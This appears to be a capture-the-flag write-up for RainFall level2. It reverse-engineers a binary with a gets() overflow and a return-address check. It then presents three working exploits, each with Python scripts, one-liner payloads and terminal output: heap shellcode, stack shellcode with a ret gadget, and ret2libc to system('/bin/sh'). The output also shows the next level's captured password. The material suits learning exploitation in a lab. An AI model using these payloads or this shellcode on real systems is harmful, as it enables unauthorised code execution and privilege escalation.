

### notes
```c
0x080484d4  p
0x0804853f  main
```

### 0x0804853f : main() : disassembly
* __`<0> -> <+3> : prepare stack frame for main function`__
```c
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
```
* __`<+6> : call the p function`__
```
0x08048545 <+6>:	call   0x80484d4 <p>
```

* __`<+11> -> <+12> : exit the MAIN FUNCTION`__
```c
0x0804854a <+11>:	leave  
0x0804854b <+12>:	ret  
```

### 0x080484d4 : p() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    const returnAddress = ebp+4
    char *buffer1[65 ~ 76-12] = ebp-76 // ~ebp-0x4c
    char *returnAddress = ebp-12 = returnAddress // ~ebp-0xc


    // 0x68 ... 104
    // 0x4c ... 76
    // 0xc  ... 12
}
```
* __`<0> -> <+3> : prepare stack frame for p function with size of 104`__
```c
0x080484d4 <+0>:	push   ebp
0x080484d5 <+1>:	mov    ebp,esp
0x080484d7 <+3>:	sub    esp,104
```
```c
0x080484da <+6>:	mov    eax,ds:0x8049860 // stdout
0x080484df <+11>:	mov    DWORD PTR [esp],eax
0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
fflush(stdout)
```
```c
0x080484e7 <+19>:	lea    eax,[buffer1]
0x080484ea <+22>:	mov    DWORD PTR [esp],eax
0x080484ed <+25>:	call   0x80483c0 <gets@plt>
gets(buffer1)
```
```c
0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+4 ~ addr of return]
0x080484f5 <+33>:	mov    DWORD PTR [returnAddress],eax
0x080484f8 <+36>:	mov    eax,DWORD PTR [returnAddress]
0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>
if(returnAddress && 0xb0000000 != 0xb0000000){
    jump to <p+83>
}

```
```c
0x08048507 <+51>:	mov    eax,0x8048620 // "(%p)\n"
0x0804850c <+56>:	mov    edx,DWORD PTR [returnAddress]
0x0804850f <+59>:	mov    DWORD PTR [esp+4],edx
0x08048513 <+63>:	mov    DWORD PTR [esp],eax
0x08048516 <+66>:	call   0x80483a0 <printf@plt>
printf("(%p)\n", returnAddress)
```
```c
0x0804851b <+71>:	mov    DWORD PTR [esp],1
0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
exit(1)
```
```c
0x08048527 <+83>:	lea    eax,[buffer1]
0x0804852a <+86>:	mov    DWORD PTR [esp],eax
0x0804852d <+89>:	call   0x80483f0 <puts@plt>
puts(buffer)
```
```c
0x08048532 <+94>:	lea    eax,[buffer1]
0x08048535 <+97>:	mov    DWORD PTR [esp],eax
0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
strdup(buffer1)
```
```c
0x0804853d <+105>:	leave  
0x0804853e <+106>:	ret 
return
```
### Code Prediction 
```c
void p() {
    char *buffer1[64];
    char *returnAddress = __return_address__;

    fflush(stdout);
    gets(buffer1);

    if(returnAddress & 0xb0000000 == 0xb0000000){
        printf("(%p)\n", returnAddress);
        exit(1);
    }
    puts(buffer);
    strdup(buffer1);
    return;
}
int main(int argc(ebp+0x8), char **argv(ebp+12)) {
    p()
    return ();
    
}

```
### Stack Illustration
```c
|-------------------|   <----- HIGH ADDRESSE
|                   |
|-------------------| +12                                                         
|                   |                                                   
|-------------------| +8                                                  
|       OLD_EIP     | eip of main fubction                                
|-------------------| +4                                                
|       OLD_EBP     | ebp of main function                              
|-------------------| <---EBP <---------------------------\
|and esp,0xfffffff0 | <--- stack alignement               |
|-------------------|                                     |
|      MAIN_EIP     |                                     | main frame
|-------------------|                                     |
|      MAIN_EBP     |                                     |
|-------------------| +104 <-------------------------------
|                   |                                     |
|-------------------| +100                                |
|                   |                                     |
|-------------------| +96 <-------+                       |
|  addr in ebp+4    |             | returnAddress buffer  |
|-------------------| +92 <-------+                       |
|  end of buffer1   |             |                       |
|-------------------| +88         |                       |
|                   |             |                       |
|-------------------| +84         | buffer1 (64 bytes)    |
          *                       |                       |
          *                       |                       |
          *                       |                       | p  frame (104 bytes)
|-------------------|             |                       |
| start of buffer1  |             |                       |
|-------------------| +28  <------/                       |
|                   |                                     |
|-------------------| +24                                 |        
|                   |                                     |
|-------------------| +20                                 |       
|                   |                                     |
|-------------------| +16                                 |         
|                   |                                     |
|-------------------| +12                                 |         
|                   |                                     |
|-------------------| +8                                  |           
|                   |                                     |
|-------------------| +4                                  |          
|                   |                                     |
|-------------------| <---ESP  low memory address---------/
```
---
### Process of the Exploit
- the code apply the & operation with `0xb0000000` to prevent us from overwriting the EIP with a stack address
which means we cant inject shellcode on stack with the normal way
as we can see the program uses strdup , which means the Heap since strddup calls malloc,
good
we either can inject shellcode in the Heap
or : inject shellcode in the stack but add a gadget address to bypass that check
or : use the `ret2libc` exploit (call the system function with "/bin/sh") and also add a gadget address to bypass the check 

lets find the offset where the program fall into the buffer overflow
1- using online tool [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
- in gdb :
    ```c
    Starting program: /home/user/level2/level2 <<<  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    Program received signal SIGSEGV, Segmentation fault.
    Error while running hook_stop:
    No function contains program counter for selected frame.
    0x37634136 in ?? () <=== offset : 80
    (gdb) 

    ```
2- manually
lets break point after the the gets call so we can see the stack after being filled with out input (`AAAABBBBCCCCDDDDEEEE`)
 - in gdb :
    ```c
    (gdb) disass p
    0x080484d4 <+0>:	push   ebp
    0x080484d5 <+1>:	mov    ebp,esp
    0x080484d7 <+3>:	sub    esp,0x68
    0x080484da <+6>:	mov    eax,ds:0x8049860
    0x080484df <+11>:	mov    DWORD PTR [esp],eax
    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
    0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
    0x080484ea <+22>:	mov    DWORD PTR [esp],eax
    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
    0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4] <-------- here
    (gdb) b * 0x080484f2
    Breakpoint 4 at 0x80484f2
    (gdb) run
    Starting program: /home/user/level2/level2 
    AAAABBBBCCCCDDDDEEEE
    Dump of assembler code for function p:
    0x080484d4 <+0>:	push   ebp
    0x080484d5 <+1>:	mov    ebp,esp
    0x080484d7 <+3>:	sub    esp,0x68
    0x080484da <+6>:	mov    eax,ds:0x8049860
    0x080484df <+11>:	mov    DWORD PTR [esp],eax
    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
    0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
    0x080484ea <+22>:	mov    DWORD PTR [esp],eax
    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
    => 0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
    0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
        *
        *
        *
    0x0804853d <+105>:	leave  
    0x0804853e <+106>:	ret    
    End of assembler dump.
    ------------------------- [FRAME] -------------------------
    Stack level 0, frame at 0xbffff720:
    eip = 0x80484f2 in p; saved eip 0x804854a
    called by frame at 0xbffff730
    Arglist at 0xbffff718, args: 
    Locals at 0xbffff718, Previous frame's sp is 0xbffff720
    Saved registers:
    ebp at 0xbffff718, eip at 0xbffff71c
    -----------------------------------------------------------
    (gdb) x 0xbffff71c
    0xbffff71c:	0x0804854a

    ```
so our __EIP__ is at ___0xbffff71c___ (108 bytes from the ESP) containing : ___0x0804854a___ (which is main<+11> Leave instruction)
- lets view our stack now:

    [![stack view](./Ressources/level2-stack-overflow-anim.png)](./Ressources/level2-stack-overflow-anim.png)

    the start of the our buffer wher the user input is taken its at 0x41414141 (AAAA)
    and we notice our eip away from it with 80 bytes(4 * 4 * 5) 
- lets fill again the our buffer with `A` 80 times

    LOOOOK AT THIS : 
    ```
    (gdb) x/30wx $esp
    0xbffff6b0:	0xbffff6cc	0x00000000	0x00000000	0xb7e5ec73
    0xbffff6c0:	0x080482b5	0xbffff7c4	0xbffff8ee	0x41414141
    0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
    0xbffff710:	0x41414141	0x41414141	0x41414141	0x08048500
    0xbffff720:	0x08048550	0x00000000
    (gdb) 
    ```
it stoped exactly at our EIP address,
now we have a clear answer that the __offset of the buffer overflow is 80__

---
good, but we cant use the normal shellcode injection
which is 
__payload = NOPSLIDE + SHELLCODE + ADDRESS TO NOPS (overwrite EIP with it)__
becus we have this check in the code:
```c
if(returnAddress & 0xb0000000 == 0xb0000000){
    printf("(%p)\n", returnAddress);
    exit(1);
}
```
which is applied to EIP address starting with `0xb` and stack addresses all start with it,
so whenever its matched it will exit the program
- the solution its simple : in the offset we put a gadget address (address that will be used to skip that check that doesnt start with `0xb`) like the return address of main function or p function
- the pprogramm also save our buffer into the Heap using strdup
- the Heap address start from __0x0804a000__ (we can use it as return address since it doesnt start with 0xb)

##### Exploit using shellcode:
in the stack : ___NOPS + SHELLCODE + GADGET_ADDRESS + NOPS_ADDRESS___
in the Heap :  ___SHELLCODE + NOPS + Heap_ADDRESS(return of strdup)___
##### Exploit using Ret2Libc:
read about the ret2libc from the docs metioned bellow,
PADDING + GADGET_ADDRESS + SYSTEM + EXIT + SHELL
- the padding is __80__
- GADGET_ADDRESS : we can take the return address of main function __0x0804854b__
- system : __0xb7e6b060__
    how to find it
    ```c
    (gdb) p system
    $7 = {<text variable, no debug info>} 0xb7e6b060 <system>
    (gdb) 
    ```
- exit : __0xb7e5ebe0__
    how to find it
    ```c
    (gdb) p exit
    $8 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
    (gdb)
    ```
- shell : __0xb7f8cc58__
    how to find it
    ```c
    (gdb) find system, +9999999, "/bin/sh"
    0xb7f8cc58
    warning: Unable to access target memory at 0xb7fd3160, halting search.
    1 pattern found.

    (gdb) x/s 0xb7f8cc58
    0xb7f8cc58:	 "/bin/sh"
    (gdb) 
    ```
- payload : __NOPS * 80 + 0x0804854b + 0xb7e6b060 + 0xb7e5ebe0 + 0xb7f8cc58__



---  
### Solution :

##### 1:- use the shellcode exploit in the Heap
since the programm calls strdup which calls malloc 
that's mean a Heap there baby :* 
which mean we can use the address of tha allocated Heap section to execute our shell code after we fill the buffer of 80 
which mean we can write our adress after 80 character



```shell
level2@RainFall:~$ ltrace ./level2  <<< "AAAABBBBCCCC"

__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                               = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)    = 0xbffff6fc
puts("AAAABBBBCCCC"AAAABBBBCCCC
)                             = 13
strdup("AAAABBBBCCCC")                           = 0x0804a008
+++ exited (status 8) +++

level2@RainFall:~$
```
strdup returns __0x0804a008__

HeapAdd = 0x0804a008
shell code + padding + HeapAddress = 84
....21.................59..................4...........= 84
- script that helps generate the exploit
```python
import struct
shell_code = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
#80 cd c9 31 e3 89 6e 69 62 2f 68 73 2f 2f 68 52 99 58 0b 6a
padding = "A" * 59
HeapAddress = struct.pack("I", 0x0804a008) # convert the Heapr address to little indian format

print(shell_code + padding + HeapAddress)
```
inline : __`(python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 + "\x08\x04\xa0\x08"[::-1])'; cat -) | ./level2`__

* terminal  : 

    ```shell
    level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 + "\x08\x04\xa0\x08"[::-1])'; cat -) | ./level2
    j
    X�Rh//shh/bin��1�̀������������������������������������������������������
    whoami
    level3
    pwd
    /home/user/level2
    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
    ```

___
##### 2:- use the shellcode exploit in the Stack
python script
```python
import struct
padding = "\x90" * 80
# padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" # length 80
shellcode =  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
skipAddre = struct.pack("I", 0x0804853e) # to bypass the return address check
EIP = struct.pack("I", 0xbffff71c + 60) # stack address but we move forward by x bytes to drop in nopslide nopslide
NOP  = "\x90" * 100 # \x90 == nothing == nosplide : 
                         # when program get redirected to this aread of nops it will sldie to the shell code
print(padding + skipAddre + EIP + NOP + shellcode)
```
inline : __`(python -c 'print("\x90" * 80  + "\x08\x04\x85\x3e"[::-1] + "\xbf\xff\xf7\x5c"[::-1] + "\x90" * 100+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'; cat -) | ./level2`__
* terminal  : 

    ```shell
    level2@RainFall:~$ (python -c 'print("\x90" * 80  + "\x08\x04\x85\x3e"[::-1] + "\xbf\xff\xf7\x5c"[::-1] + "\x90" * 100+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'; cat -) | ./level2
    ����������������������������������������������������������������>������������>\�������������������������������������������������������������������������������������������������������j
                                                                            X�Rh//shh/bin��1�̀
    whoami
    level3
    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
    ```
___
##### 3:- use Ret2Libc exploit in the stack

python script
```py
import struct
# p()    return_adress = 0x0804853e
# main() return_adress = 0x0804854b

padding = "\x90" * 80
ret_adress = str(struct.pack("I", 0x0804853e)) #p() func ret addr
system = str(struct.pack("I", 0xb7e6b060))
returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0)) # address of exit() function , system need it 
bin_sh = str(struct.pack("I", 0xb7f8cc58)) # /bin/sh

payload = padding + ret_adress + system + returnAfterSystem +  bin_sh
#          80     +     4      +    4   +         4         +   4 
print(payload)

```
inline : __`(python -c 'print("\x90" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'; cat -) | ./level2`__
* terminal  : 

    ```shell
    level2@RainFall:~$ (python -c 'print("\x90" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'; cat -) | ./level2
    ����������������������������������������������������������������>������������>`�����X���
    pwd
    /home/user/level2
    whoami
    level3
    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
    ```
---

### Ressources :

1. [ret2lib - exact exercice - protostart](https://0xrick.github.io/binary-exploitation/bof6/)
1. [buffer overflow + shellcode ](https://0xrick.github.io/binary-exploitation/bof5/)
1. [same exercice in protostart](https://exploit.education/protostar/stack-six/)
1. [exercice solved in video](https://youtu.be/m17mV24TgwY?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
1. [SEXY ARTICLE](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)